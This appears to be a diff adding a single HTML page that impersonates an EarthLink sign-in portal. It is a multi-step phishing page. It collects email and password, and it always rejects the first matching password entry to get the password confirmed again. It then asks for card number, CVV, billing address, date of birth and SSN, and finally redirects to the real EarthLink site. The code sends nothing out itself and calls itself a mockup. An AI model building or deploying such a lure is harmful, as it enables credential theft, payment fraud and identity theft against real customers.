@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>EarthLink – Sign In</title>
+    <style>
+        :root {
+            --bg-color: #1a1a1a;
+            --card-bg: #242424;
+            --text-main: #ffffff;
+            --text-sub: #b0b0b0;
+            --primary-blue: #009cde;
+            --primary-blue-hover: #0082ba;
+            --border-color: #444444;
+            --input-bg: #2a2a2a;
+            --orange-accent: #f59322;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 16px;
+        }
+
+        /* --- Header & Search --- */
+        .earthlink-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 0 4px;
+        }
+
+        .hamburger {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
+        .logo-icon {
+            color: var(--orange-accent);
+            margin-right: 8px;
+            font-size: 1.4rem;
+        }
+
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background: white;
+            border-radius: 4px;
+            padding: 8px 12px;
+            margin-bottom: 24px;
+            color: #333;
+        }
+
+        .search-logo {
+            display: flex;
+            align-items: center;
+            font-size: 0.8rem;
+            font-weight: 600;
+            border-right: 1px solid #ccc;
+            padding-right: 8px;
+            margin-right: 8px;
+        }
+
+        .search-logo .logo-icon {
+            font-size: 1rem;
+            margin-right: 4px;
+        }
+
+        .search-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 0.9rem;
+            color: #333;
+        }
+
+        .search-icon {
+            color: #666;
+            font-size: 1.1rem;
+        }
+
+        /* --- Main Content --- */
+        .content-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .card {
+            display: none;
+        }
+
+        .card.active {
+            display: block;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .description {
+            color: var(--text-sub);
+            font-size: 0.95rem;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.9rem;
+            margin-bottom: 6px;
+            color: var(--text-main);
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px;
+            padding-right: 44px; /* Make room for the icon */
+            font-size: 1rem;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            background-color: var(--input-bg);
+            color: var(--text-main);
+            transition: 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+        }
+
+        .input-wrapper .icon {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-sub);
+            font-size: 1.1rem;
+        }
+
+        /* --- Password Toggle Icon --- */
+        .input-wrapper .toggle-password {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-sub);
+            z-index: 10;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+
+        .input-wrapper .toggle-password:hover {
+            color: var(--text-main);
+        }
+
+        .input-wrapper .toggle-password svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .checkbox-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 16px 0 24px;
+            font-size: 0.9rem;
+        }
+
+        .checkbox-row label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .checkbox-row input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--primary-blue);
+        }
+
+        .checkbox-row a {
+            color: var(--text-main);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 12px;
+            border: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-blue);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-blue-hover);
+        }
+
+        .btn-secondary {
+            background-color: white;
+            color: #333;
+        }
+
+        .btn-secondary:hover {
+            background-color: #e6e6e6;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--text-sub);
+            font-size: 0.9rem;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .divider::before { margin-right: 16px; }
+        .divider::after { margin-left: 16px; }
+
+        .small-text {
+            text-align: center;
+            font-size: 0.9rem;
+            margin-bottom: 16px;
+            color: var(--text-main);
+        }
+
+        /* --- Error Banner --- */
+        .error-banner {
+            background: #3a1a1a;
+            border-left: 4px solid #e74c3c;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: none;
+            font-size: 0.9rem;
+            color: #fff;
+        }
+
+        .error-code {
+            font-weight: 600;
+            color: #e74c3c;
+        }
+
+        /* --- Footer Menu --- */
+        .footer-menu {
+            margin-top: 40px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 20px;
+        }
+
+        .footer-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--border-color);
+            font-size: 1.1rem;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .footer-item span {
+            color: var(--text-sub);
+            font-size: 1.2rem;
+        }
+
+        .socials-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 24px 0 12px;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .social-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: black;
+            font-weight: bold;
+            font-size: 1.1rem;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--text-sub);
+            line-height: 1.6;
+            margin-bottom: 40px;
+        }
+
+        .footer-bottom a {
+            color: var(--text-main);
+            text-decoration: none;
+            border-bottom: 1px solid var(--text-main);
+        }
+
+        /* --- Floating Action Button --- */
+        .fab {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: var(--orange-accent);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 1.8rem;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            cursor: pointer;
+            z-index: 100;
+        }
+
+        /* --- Thank You Card --- */
+        .thank-you-message {
+            text-align: center;
+            padding: 40px 0;
+        }
+        .thank-you-message h2 {
+            color: var(--primary-blue);
+        }
+        .thank-you-message p {
+            color: var(--text-sub);
+            margin: 16px 0 24px;
+        }
+    </style>
+  </head>
+  <body>
+    <!-- HEADER -->
+    <div class="earthlink-header">
+      <div class="hamburger">☰</div>
+      <div class="logo-container">
+        <span class="logo-icon">🪐</span> EarthLink
+      </div>
+    </div>
+    <!-- SEARCH BAR -->
+    <div class="search-bar">
+      <div class="search-logo">
+        <span class="logo-icon">🪐</span> EarthLink ▾
+      </div>
+      <input type="text" class="search-input" placeholder="Search" />
+      <div class="search-icon">🔍</div>
+    </div>
+    <!-- MAIN CONTENT -->
+    <div class="content-wrapper">
+      <!-- ========== CARD 1: LOGIN (EMAIL) ========== -->
+      <div class="card active" id="loginCard">
+        <h2>Sign In</h2>
+        <div class="description">Enter your Email Address or User ID to continue.</div>
+        <div id="emailErrorBanner" class="error-banner">
+          <span class="warning-icon">⚠️</span> The info you entered doesn't match our records. Please try again. <span class="error-code">IDID-3104</span>.
+        </div>
+        <div class="form-group">
+          <label>Email Address Or User ID</label>
+          <div class="input-wrapper">
+            <input type="text" id="emailInput" placeholder="Email Address Or User ID" autocomplete="off" />
+            <span class="icon">✉️</span>
+          </div>
+        </div>
+        <div class="checkbox-row">
+          <label>
+            <input type="checkbox" id="staySigned" checked />
+            Remember Me
+          </label>
+          <a href="#">Forgot Password?</a>
+        </div>
+        <button class="btn btn-primary" id="signinBtn">Continue</button>
+        <div class="divider">or</div>
+        <div class="small-text">First time using the new MyAccount Portal?</div>
+        <button class="btn btn-primary" id="registerBtn">Register Your Account Now</button>
+        <button class="btn btn-secondary" id="paymentBtn">Make a Payment</button>
+        <button class="btn btn-secondary" id="supportBtn">Support</button>
+      </div>
+      <!-- ========== CARD 2: PASSWORD (DUAL INPUT) ========== -->
+      <div class="card" id="passwordCard">
+        <h2>Enter Your Password</h2>
+        <div class="description">
+          Please enter your password to securely access your account.
+        </div>
+        <!-- Error banner specifically for the password card -->
+        <div id="passwordErrorBanner" class="error-banner" style="display: none;">
+          <span class="warning-icon">⚠️</span> The info you entered doesn't match our records. Please try again. <span class="error-code">IDID-3104</span>.
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <div class="input-wrapper">
+            <input type="password" id="passwordInput" placeholder="Enter your password" />
+            <span class="toggle-password" onclick="togglePasswordVisibility('passwordInput', this)">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z">
+                </path>
+                <circle cx="12" cy="12" r="3">
+                </circle>
+              </svg>
+            </span>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Confirm Password</label>
+          <div class="input-wrapper">
+            <input type="password" id="confirmPasswordInput" placeholder="Confirm your password" />
+            <span class="toggle-password" onclick="togglePasswordVisibility('confirmPasswordInput', this)">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z">
+                </path>
+                <circle cx="12" cy="12" r="3">
+                </circle>
+              </svg>
+            </span>
+          </div>
+        </div>
+        <button class="btn btn-primary" id="passwordContinueBtn">Continue</button>
+      </div>
+      <!-- ========== CARD 3: CONFIRM ACCOUNT ========== -->
+      <div class="card" id="confirmCard">
+        <h2>Please Confirm Your Account Information</h2>
+        <div class="description">
+          To help keep your account secure, EarthLink needs to confirm this account belongs to you.
+        </div>
+        <button class="btn btn-primary" id="confirmContinueBtn">Continue</button>
+      </div>
+      <!-- ========== CARD 4: PAYMENT ========== -->
+      <div class="card" id="paymentCard">
+        <h2>Payment Information</h2>
+        <div class="form-group">
+          <label>Name on Card</label>
+          <div class="input-wrapper">
+            <input type="text" id="cardName" placeholder="Full name on Card" />
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Card Number</label>
+          <div class="input-wrapper">
+            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" />
+          </div>
+        </div>
+        <div class="row" style="display: flex; gap: 16px;">
+          <div class="form-group" style="flex: 1;">
+            <label>Expiry Date</label>
+            <div class="input-wrapper">
+              <input type="text" id="cardExpiry" placeholder="MM/YY" />
+            </div>
+          </div>
+          <div class="form-group" style="flex: 1;">
+            <label>CVV</label>
+            <div class="input-wrapper">
+              <input type="text" id="cardCvv" placeholder="123" />
+            </div>
+          </div>
+        </div>
+        <button class="btn btn-primary" id="continuePaymentBtn">Continue</button>
+      </div>
+      <!-- ========== CARD 5: BILLING ========== -->
+      <div class="card" id="billingCard">
+        <h2>Billing Information</h2>
+        <div class="form-group">
+          <label>Billing Address</label>
+          <div class="input-wrapper">
+            <input type="text" id="billingAddress" placeholder="Street address" />
+          </div>
+        </div>
+        <div class="form-group">
+          <label>City</label>
+          <div class="input-wrapper">
+            <input type="text" id="billingCity" placeholder="City" />
+          </div>
+        </div>
+        <div class="row" style="display: flex; gap: 16px;">
+          <div class="form-group" style="flex: 1;">
+            <label>State</label>
+            <div class="input-wrapper">
+              <input type="text" id="billingState" placeholder="State" />
+            </div>
+          </div>
+          <div class="form-group" style="flex: 1;">
+            <label>Zipcode</label>
+            <div class="input-wrapper">
+              <input type="text" id="billingZip" placeholder="Zipcode" />
+            </div>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Phone Number</label>
+          <div class="input-wrapper">
+            <input type="tel" id="billingPhone" placeholder="(123) 456-7890" />
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Date of Birth</label>
+          <div class="input-wrapper">
+            <input type="text" id="billingDob" placeholder="MM/DD/YYYY" />
+          </div>
+        </div>
+        <div class="form-group">
+          <label>SSN</label>
+          <div class="input-wrapper">
+            <input type="password" id="billingSsn" placeholder="**********" />
+            <span class="toggle-password" onclick="togglePasswordVisibility('billingSsn', this)">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z">
+                </path>
+                <circle cx="12" cy="12" r="3">
+                </circle>
+              </svg>
+            </span>
+          </div>
+        </div>
+        <button class="btn btn-primary" id="continueBillingBtn">Continue</button>
+      </div>
+      <!-- ========== CARD 6: FINAL THANK YOU ========== -->
+      <div class="card" id="finalCard">
+        <div class="thank-you-message">
+          <h2>✅ All information submitted.</h2>
+          <p>Thank you for your trust. You will now be redirected to EarthLink.</p>
+          <button class="btn btn-primary" id="redirectBtn">Continue to EarthLink</button>
+        </div>
+      </div>
+      <!-- FOOTER MENU -->
+      <div class="footer-menu">
+        <div class="footer-item">Internet <span>›</span>
+      </div>
+      <div class="footer-item">Resources <span>›</span>
+    </div>
+    <div class="footer-item">EarthLink <span>›</span>
+  </div>
+  <div class="footer-item">Help <span>›</span>
+</div>
+<div class="footer-item">Account <span>›</span>
+</div>
+</div>
+<div class="socials-title">Follow EarthLink</div>
+<div class="social-icons">
+  <div class="social-icon">𝕏</div>
+  <div class="social-icon">f</div>
+  <div class="social-icon">in</div>
+  <div class="social-icon">▶</div>
+</div>
+<div class="footer-bottom">
+  © Copyright 2026 EarthLink LLC<br>
+  All rights reserved<br>
+  <a href="#">Privacy Policy</a> · <a href="#">Interest-Based Ads</a>
+</div>
+</div>
+<!-- FLOATING ACTION BUTTON -->
+<div class="fab">🪐</div>
+<script>
+        // ============================================================
+        // 👁️ PROFESSIONAL PASSWORD VISIBILITY TOGGLE (SVG Icons)
+        // ============================================================
+        const eyeOpenSVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
+        
+        const eyeClosedSVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>`;
+
+        function togglePasswordVisibility(inputId, iconElement) {
+            const input = document.getElementById(inputId);
+            if (input.type === "password") {
+                input.type = "text";
+                iconElement.innerHTML = eyeClosedSVG; // Show slashed eye when visible
+            } else {
+                input.type = "password";
+                iconElement.innerHTML = eyeOpenSVG; // Show open eye when hidden
+            }
+        }
+
+        // ============================================================
+        // ⚠️ UI LOGIC (Pop-ups disabled, silent mockup functionality)
+        // ============================================================
+
+        // --- Card Switching Logic ---
+        function showCard(cardId) {
+            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+            document.getElementById(cardId).classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // --- Card 1: Email Logic ---
+        const emailInput = document.getElementById("emailInput");
+        const signinBtn = document.getElementById("signinBtn");
+        const emailErrorBanner = document.getElementById("emailErrorBanner");
+
+        signinBtn.addEventListener("click", () => {
+            const email = emailInput.value.trim();
+
+            if (!email) {
+                emailErrorBanner.style.display = "block";
+                emailErrorBanner.innerHTML = `<span class="warning-icon">⚠️</span> Please enter your Email Address or User ID.`;
+                return;
+            }
+
+            // Proceed to Password Card
+            emailErrorBanner.style.display = "none";
+            showCard('passwordCard');
+        });
+
+        // --- Card 2: Password Logic ---
+        const passwordContinueBtn = document.getElementById("passwordContinueBtn");
+        const passwordErrorBanner = document.getElementById("passwordErrorBanner");
+        let passwordAttempt = 0; // Track attempts
+
+        passwordContinueBtn.addEventListener("click", () => {
+            const password = document.getElementById("passwordInput").value.trim();
+            const confirmPassword = document.getElementById("confirmPasswordInput").value.trim();
+
+            if (!password || !confirmPassword) {
+                passwordErrorBanner.style.display = "block";
+                passwordErrorBanner.innerHTML = `<span class="warning-icon">⚠️</span> Please fill in both password fields.`;
+                return;
+            }
+
+            // 1. Check if the two inputs match. If not, show mismatch error.
+            if (password !== confirmPassword) {
+                passwordErrorBanner.style.display = "block";
+                passwordErrorBanner.innerHTML = `<span class="warning-icon">⚠️</span> The passwords you entered do not match. Please try again.`;
+                return;
+            }
+
+            // 2. If they DO match, track the attempt
+            passwordAttempt++;
+
+            // 3. First time matching passwords -> Show "doesn't match records" error
+            if (passwordAttempt === 1) {
+                passwordErrorBanner.style.display = "block";
+                passwordErrorBanner.innerHTML = `<span class="warning-icon">⚠️</span> The info you entered doesn't match our records. Please try again. <span class="error-code">IDID-3104</span>.`;
+                
+                // Clear inputs to simulate a fresh attempt
+                document.getElementById("passwordInput").value = "";
+                document.getElementById("confirmPasswordInput").value = "";
+                
+                // Reset visibility back to hidden and change icons back to open eye
+                document.getElementById("passwordInput").type = "password";
+                document.getElementById("confirmPasswordInput").type = "password";
+                document.querySelectorAll(".toggle-password").forEach(el => {
+                    if (el.closest('.form-group').querySelector('#passwordInput') || 
+                        el.closest('.form-group').querySelector('#confirmPasswordInput')) {
+                        el.innerHTML = eyeOpenSVG;
+                    }
+                });
+                return; // Stop here, do not advance
+            }
+
+            // 4. Second attempt matching passwords -> Proceed
+            passwordErrorBanner.style.display = "none";
+            showCard('confirmCard');
+        });
+
+        // --- Card 3: Confirm Account Logic ---
+        document.getElementById("confirmContinueBtn").addEventListener("click", () => {
+            showCard('paymentCard');
+        });
+
+        // --- Card 4: Payment Logic ---
+        document.getElementById("continuePaymentBtn").addEventListener("click", () => {
+            const cardName = document.getElementById("cardName").value.trim();
+            const cardNumber = document.getElementById("cardNumber").value.trim();
+            const cardExpiry = document.getElementById("cardExpiry").value.trim();
+            const cardCvv = document.getElementById("cardCvv").value.trim();
+
+            if (!cardName || !cardNumber || !cardExpiry || !cardCvv) {
+                return; // Silently fail
+            }
+            showCard('billingCard');
+        });
+
+        // --- Card 5: Billing Logic ---
+        document.getElementById("continueBillingBtn").addEventListener("click", () => {
+            const address = document.getElementById("billingAddress").value.trim();
+            const city = document.getElementById("billingCity").value.trim();
+            const state = document.getElementById("billingState").value.trim();
+            const zip = document.getElementById("billingZip").value.trim();
+            const phone = document.getElementById("billingPhone").value.trim();
+            const dob = document.getElementById("billingDob").value.trim();
+            const ssn = document.getElementById("billingSsn").value.trim();
+
+            if (!address || !city || !state || !zip || !phone || !dob || !ssn) {
+                return; // Silently fail
+            }
+            showCard('finalCard');
+        });
+
+        // --- Final Redirect ---
+        document.getElementById("redirectBtn").addEventListener("click", () => {
+            window.location.href = "https://www.earthlink.net";
+        });
+
+        // --- Secondary Buttons (No functionality, completely silent) ---
+        document.getElementById("registerBtn").addEventListener("click", (e) => { e.preventDefault(); });
+        document.getElementById("paymentBtn").addEventListener("click", (e) => { e.preventDefault(); });
+        document.getElementById("supportBtn").addEventListener("click", (e) => { e.preventDefault(); });
+        
+        document.querySelectorAll('.footer-item, .social-icon, .hamburger, .search-bar').forEach(el => {
+            el.addEventListener('click', (e) => { e.preventDefault(); });
+        });
+    </script>
+</body>
+</html>
